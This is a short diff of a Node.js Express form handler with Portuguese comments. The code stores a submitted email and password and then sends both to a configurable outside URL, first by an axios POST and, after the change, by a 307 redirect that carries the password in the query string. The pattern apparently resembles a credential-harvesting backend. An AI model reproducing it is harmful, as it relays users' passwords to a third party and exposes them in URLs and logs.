@@ -36,15 +36,8 @@ app.post('/submit-form', (req, res) => {
             return res.status(500).send('Erro ao inserir dados no banco de dados');
         }
 
-        // Envia os dados para o endereço web especificado
-        axios.post(redirectUrl, { email, password })
-            .then(response => {
-                res.status(200).send('Dados salvos com sucesso e enviados para o endereço web!');
-            })
-            .catch(error => {
-                console.error('Erro ao enviar dados para o endereço web:', error);
-                res.status(500).send('Erro ao enviar dados para o endereço web');
-            });
+        // Redireciona para o endereço web desejado com os dados no corpo da requisição
+        res.redirect(307, redirectUrl + `?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
     });
 });
 
